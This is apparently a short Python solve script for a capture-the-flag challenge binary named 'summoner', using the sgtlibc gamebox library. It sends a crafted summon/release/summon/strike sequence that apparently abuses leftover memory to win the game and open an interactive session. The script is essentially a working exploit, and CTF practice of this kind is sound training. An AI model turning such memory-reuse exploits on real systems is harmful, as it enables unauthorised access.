import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./summoner',
    remote='node4.buuoj.cn:28143',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

sla('> ', b'summon aaaaaaaa\x05')
sla('> ', b'release')
sla('> ', b'summon aaaa')
sla('> ', b'strike')
interactive()
